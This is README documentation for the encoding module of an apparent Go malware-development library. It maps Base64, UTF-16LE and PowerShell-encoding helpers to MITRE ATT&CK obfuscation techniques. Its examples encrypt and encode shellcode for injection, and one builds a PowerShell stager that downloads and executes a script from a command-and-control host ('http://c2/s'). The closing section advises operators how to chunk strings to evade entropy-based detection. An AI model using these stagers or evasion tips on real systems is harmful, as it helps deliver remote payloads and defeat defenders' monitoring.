# Encode

Lightweight, **non-secret** transformations for moving payloads through channels that don't tolerate arbitrary bytes. The `encode` package is the companion to `crypto`: first you encrypt (confidentiality), then you encode (transport safety).

**MITRE ATT&CK:**
- [T1027.013 - Obfuscated Files or Information: Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013/)
- [T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)

---

## When to use encode vs crypto

| Goal | Use |
|------|-----|
| Keep payload secret from static analysis | `crypto` (AES-GCM / ChaCha20) |
| Break signature/YARA byte patterns | `crypto` obfuscation layer (TEA / SBox / Matrix) |
| Survive transport that mangles bytes (stdin, HTTP headers, JSON strings, PowerShell `-EncodedCommand`) | `encode` |
| Embed a binary blob in source code | `encode.Base64Encode` |
| Hand a script to `powershell.exe -EncodedCommand` | `encode.PowerShell` |

**Encoding is never confidentiality.** Base64 is trivially reversible. Encode what has already been encrypted.

---

## API

```go
// Standard Base64 (RFC 4648 §4) — padded with '='
func Base64Encode(data []byte) string
func Base64Decode(s string) ([]byte, error)

// URL-safe Base64 (RFC 4648 §5) — uses '-' and '_'; safe in URLs and filenames
func Base64URLEncode(data []byte) string
func Base64URLDecode(s string) ([]byte, error)

// UTF-16 Little-Endian — the wire format PowerShell, LSASS, and the PEB use
func ToUTF16LE(s string) []byte

// PowerShell = Base64(UTF16LE(script)) — input format for powershell -EncodedCommand
func PowerShell(script string) string

// ROT13 — novelty/steg only; breaks byte signatures for ASCII-dominant data
func ROT13(s string) string
```

---

## Integration Example

Encrypt first, then encode for a transport channel:

```go
import (
    "github.com/oioio-space/maldev/crypto"
    "github.com/oioio-space/maldev/encode"
)

// 1. Encrypt raw shellcode with AES-GCM.
key, _ := crypto.NewAESKey()
ciphertext, _ := crypto.EncryptAESGCM(key, rawShellcode)

// 2. Base64-encode for embedding in Go source / JSON / HTTP header.
embedded := encode.Base64Encode(ciphertext)

// 3. On the other side:
raw, _   := encode.Base64Decode(embedded)
stage, _ := crypto.DecryptAESGCM(key, raw)
_ = stage // inject
```

For PowerShell stagers:

```go
script := `IEX (New-Object Net.WebClient).DownloadString('http://c2/s')`
cmd := encode.PowerShell(script)
// exec.Command("powershell.exe", "-EncodedCommand", cmd)
```

---

## Detection

**None intrinsic.** Base64 strings are high-entropy but extremely common in legitimate code. Defenders watch for the _combination_:
- Long Base64 string passed to `-EncodedCommand`
- Base64 → reflective load via `System.Reflection.Assembly`
- UTF-16LE content in a text-configured channel

Mitigation from the operator side is composition: encode *after* encrypting, and chunk long strings to avoid entropy-per-line heuristics.
